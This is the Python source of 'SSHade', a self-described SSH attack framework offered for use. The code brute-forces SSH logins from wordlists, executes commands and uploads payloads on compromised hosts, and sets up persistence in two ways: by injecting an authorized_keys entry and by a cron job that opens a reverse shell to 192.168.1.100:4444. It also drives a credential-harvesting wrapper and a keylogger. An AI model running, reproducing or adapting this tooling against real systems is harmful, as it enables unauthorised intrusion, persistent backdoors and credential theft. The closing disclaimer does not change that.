#!/usr/bin/env python3
import argparse
import logging
import random
import time
import sys
import os
from typing import Optional, Dict, List
import paramiko
import yaml
from scp import SCPClient
from pathlib import Path
from colorama import init, Fore, Back, Style
from tqdm import tqdm
import threading

from attacks.credharv import CredentialHarvester
from attacks.ssh_discovery import SSHDiscovery

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Disable verbose logging
logging.getLogger("paramiko").setLevel(logging.WARNING)
logging.getLogger("scp").setLevel(logging.WARNING)

class SSHadeUI:
    """User interface with colorful output and progress tracking"""

    @staticmethod
    def print_banner():
        """Display the SSHade banner"""
        banner = (
            f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗\n"
            f"║{Fore.RED}                      SSHade - SSH Attack Framework           {Fore.CYAN}║\n"
            f"║{Fore.YELLOW}                  Advanced SSH Security Testing               {Fore.CYAN}║\n"
            f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
        )
        print(banner)

    @staticmethod
    def print_status(message: str, status_type: str = "info"):
        """Print colored status messages with icons"""
        icons = {
            "info": "ℹ️",
            "success": "✔️",
            "warning": "⚠️",
            "error": "✖️",
            "debug": "🐞"
        }
        colors = {
            "info": Fore.BLUE,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "debug": Fore.MAGENTA
        }
        icon = icons.get(status_type, "")
        color = colors.get(status_type, Fore.WHITE)
        print(f"{color}{icon} [{status_type.upper()}] {message}{Style.RESET_ALL}")

    @staticmethod
    def print_progress_bar(iteration: int, total: int, prefix: str = "", suffix: str = ""):
        """Display a progress bar using tqdm"""
        # This method is now deprecated in favor of tqdm usage in SSHade class
        pass

    @staticmethod
    def print_attack_stats(stats: Dict):
        """Display attack statistics in a formatted table"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.YELLOW}                      Attack Statistics                       {Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.GREEN}Attempts:{Style.RESET_ALL} {stats.get('attempts', 0):<45} ║")
        print(f"║ {Fore.GREEN}Successes:{Style.RESET_ALL} {stats.get('successes', 0):<44} ║")
        print(f"║ {Fore.YELLOW}Lockouts:{Style.RESET_ALL} {stats.get('lockouts', 0):<44} ║")
        print(f"║ {Fore.RED}Errors:{Style.RESET_ALL} {stats.get('connection_errors', 0):<46} ║")
        print(f"║ {Fore.MAGENTA}Duration:{Style.RESET_ALL} {stats.get('duration', 0):.1f}s{Fore.CYAN:<42} ║")
        print(f"║ {Fore.BLUE}Rate:{Style.RESET_ALL} {stats.get('rate', 0):.1f} attempts/sec{Fore.CYAN:<35} ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

class SSHade:
    def __init__(self):
        self.config = self.load_config()
        self.session_id = self.generate_id()
        self.ssh_client = None
        self.current_target = None
        self.credentials = {}
        self.ui = SSHadeUI()

    @staticmethod
    def generate_id(length=8) -> str:
        """Generate random session ID"""
        return ''.join(random.choices('abcdef0123456789', k=length))

    def load_config(self) -> Dict:
        """Load configuration from YAML file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config.yaml')
        try:
            with open(config_path, 'r') as f:
                return yaml.safe_load(f) or {}
        except FileNotFoundError:
            return {
                'default_port': 22,
                'timeout': 10,
                'brute_delay': 2.0,
                'wordlists': {
                    'users': 'data/wordlists/common_users.txt',
                    'passwords': 'data/wordlists/common_pass.txt'
                }
            }

    def connect_ssh(self, host: str, username: str, password: str, port: Optional[int] = None) -> bool:
        """Establish SSH connection"""
        port = port or self.config.get('default_port', 22)
        timeout = self.config.get('timeout', 10)
        
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                host, port=port, username=username, 
                password=password, timeout=timeout,
                banner_timeout=200
            )
            self.current_target = host
            self.credentials[host] = {'user': username, 'password': password}
            return True
        except Exception as e:
            logging.debug(f"Connection failed: {str(e)}")
            return False

    def brute_force(self, host: str, userlist: List[str], passlist: List[str]) -> bool:
        """SSH brute force attack with throttling and progress display"""
        delay = self.config.get('brute_delay', 2.0)
        port = self.config.get('default_port', 22)

        total_attempts = len(userlist) * len(passlist)
        current_attempt = 0

        self.ui.print_status(f"Starting brute force attack against {host}", "info")
        self.ui.print_status(f"Target: {len(userlist)} users × {len(passlist)} passwords = {total_attempts} attempts", "info")

        # Use tqdm progress bar
        with tqdm(total=total_attempts, unit="attempts", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]") as pbar:
            for user in userlist:
                for password in passlist:
                    current_attempt += 1

                    pbar.set_description(f"Testing {user}:{password[:10]}...")
                    pbar.update(1)

                    try:
                        if self.connect_ssh(host, user.strip(), password.strip(), port):
                            self.ui.print_status(f"SUCCESS! Credentials: {user}:{password}", "success")
                            return True
                    except Exception:
                        continue

                    # Random delay between attempts
                    time.sleep(delay + random.uniform(0, 1))

        self.ui.print_status("Brute force attack completed - no valid credentials found", "warning")
        return False

    def execute_command(self, command: str) -> Optional[str]:
        """Execute command on target"""
        if not self.ssh_client:
            self.ui.print_status("No active connection", "error")
            return None
            
        try:
            self.ui.print_status(f"Executing: {command}", "info")
            _, stdout, stderr = self.ssh_client.exec_command(command)
            result = stdout.read().decode().strip()
            if result:
                self.ui.print_status("Command executed successfully", "success")
            return result
        except Exception as e:
            self.ui.print_status(f"Command failed: {str(e)}", "error")
            return None

    def deploy_payload(self, local_path: str, remote_path: str = "/tmp/") -> bool:
        """Upload file via SCP with progress display"""
        try:
            self.ui.print_status(f"Uploading {local_path} to {remote_path}", "info")
            with SCPClient(self.ssh_client.get_transport()) as scp:
                scp.put(local_path, remote_path)
                self.ui.print_status("File uploaded successfully", "success")
                return True
        except Exception as e:
            self.ui.print_status(f"SCP upload failed: {str(e)}", "error")
            return False

    def establish_persistence(self, key_path: Optional[str] = None) -> bool:
        """Establish persistence via SSH key or cron job"""
        if key_path:
            return self._key_persistence(key_path)
        else:
            return self._cron_persistence()

    def _key_persistence(self, key_path: str) -> bool:
        """Inject SSH key for persistence"""
        try:
            self.ui.print_status("Establishing SSH key persistence", "info")
            # Upload public key
            remote_auth_keys = "~/.ssh/authorized_keys"
            self.execute_command(f"mkdir -p ~/.ssh")
            with open(key_path, 'r') as f:
                pub_key = f.read().strip()
            
            cmd = f"echo '{pub_key}' >> {remote_auth_keys}"
            result = self.execute_command(cmd)
            if result is not None:
                self.ui.print_status("SSH key persistence established", "success")
                return True
            return False
        except Exception as e:
            self.ui.print_status(f"Key persistence failed: {str(e)}", "error")
            return False

    def _cron_persistence(self) -> bool:
        """Establish persistence via cron job"""
        try:
            self.ui.print_status("Establishing cron persistence", "info")
            # Add a cron job for persistence
            cron_cmd = "echo '* * * * * /bin/bash -c \"sleep 30 && /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"' | crontab -"
            result = self.execute_command(cron_cmd)
            if result is not None:
                self.ui.print_status("Cron persistence established", "success")
                return True
            return False
        except Exception as e:
            self.ui.print_status(f"Cron persistence failed: {str(e)}", "error")
            return False

    def cleanup(self):
        """Clean up connections and artifacts"""
        if self.ssh_client:
            self.ssh_client.close()
            self.ssh_client = None
            self.ui.print_status("Connection cleaned up", "info")

def load_wordlist(path: str) -> List[str]:
    """Load wordlist from file"""
    try:
        with open(path, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        SSHadeUI.print_status(f"Wordlist not found: {path}", "error")
        return []

def main():
    # Display banner
    SSHadeUI.print_banner()
    
    parser = argparse.ArgumentParser(description="SSHade - SSH Attack Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, help="SSH port (default: 22)")
    parser.add_argument("-m", "--mode", required=True, 
                      choices=["brute", "key", "persist", "exec", "credharv", "discover"],
                      help="Attack mode")
    
    
    # Brute force options
    parser.add_argument("-u", "--users", help="Username wordlist path")
    parser.add_argument("-w", "--passwords", help="Password wordlist path")
    
    # Key authentication options
    parser.add_argument("-k", "--key", help="SSH private key path")
    
    # Command execution
    parser.add_argument("-c", "--command", help="Command to execute")

    # Credential harvester options
    parser.add_argument("--credharv-action", choices=["wrapper", "keylogger"], help="Credential harvester action to perform")
    
    args = parser.parse_args()
    
    tool = SSHade()
    
    try:
        SSHadeUI.print_status(f"Target: {args.target}", "info")
        SSHadeUI.print_status(f"Mode: {args.mode}", "info")
        
        if args.mode == "brute":
            users = load_wordlist(args.users or tool.config['wordlists']['users'])
            passwords = load_wordlist(args.passwords or tool.config['wordlists']['passwords'])
            
            SSHadeUI.print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", "info")
            
            if tool.brute_force(args.target, users, passwords):
                SSHadeUI.print_status("SUCCESSFUL LOGIN!", "success")
                SSHadeUI.print_status(f"Credentials: {tool.credentials[args.target]}", "success")
            else:
                SSHadeUI.print_status("Brute force failed", "warning")
                
        elif args.mode == "key" and args.key:
            SSHadeUI.print_status("Key-based authentication not yet implemented", "warning")
            
        elif args.mode == "persist":
            if tool.connect_ssh(args.target, *list(tool.credentials.get(args.target, {}).values())):
                if tool.establish_persistence(args.key):
                    SSHadeUI.print_status("Persistence established", "success")
                else:
                    SSHadeUI.print_status("Failed to establish persistence", "error")
                    
        elif args.mode == "exec" and args.command:
            if tool.connect_ssh(args.target, *list(tool.credentials.get(args.target, {}).values())):
                result = tool.execute_command(args.command)
                if result:
                    SSHadeUI.print_status("Command output:", "info")
                    print(f"{Fore.CYAN}{result}{Style.RESET_ALL}")
                else:
                    SSHadeUI.print_status("Command failed", "error")

        elif args.mode == "credharv":
            if not args.credharv_action:
                SSHadeUI.print_status("Please specify --credharv-action with 'wrapper' or 'keylogger'", "error")
            else:
                # Connect using stored credentials
                creds = tool.credentials.get(args.target)
                if not creds:
                    SSHadeUI.print_status("No stored credentials for target. Please login first.", "error")
                else:
                    if tool.connect_ssh(args.target, creds['user'], creds['password'], args.port):
                        harvester = CredentialHarvester(tool.ssh_client)
                        success = False
                        if args.credharv_action == "wrapper":
                            success = harvester.install_ssh_wrapper()
                        elif args.credharv_action == "keylogger":
                            success = harvester.install_keylogger()
                        if success:
                            SSHadeUI.print_status(f"Credential harvester '{args.credharv_action}' installed successfully", "success")
                        else:
                            SSHadeUI.print_status(f"Failed to install credential harvester '{args.credharv_action}'", "error")
                    else:
                        SSHadeUI.print_status("SSH connection failed with stored credentials", "error")

        elif args.mode == "discover":
            discovery = SSHDiscovery(port=args.port or tool.config.get('default_port', 22))
            live_hosts = discovery.scan_network(args.target)
            if live_hosts:
                SSHadeUI.print_status(f"Discovered {len(live_hosts)} SSH hosts:", "success")
                for host in live_hosts:
                    print(f" - {host}")
            else:
                SSHadeUI.print_status("No SSH hosts discovered", "warning")
                    
    except KeyboardInterrupt:
        SSHadeUI.print_status("Interrupted by user", "warning")
    except Exception as e:
        SSHadeUI.print_status(f"Unexpected error: {e}", "error")
    finally:
        tool.cleanup()

if __name__ == "__main__":
    main()

#Make sure to NOT use this tool to harm anyone in anyway
#Thanks for supporting me check out my github for more tools comming out
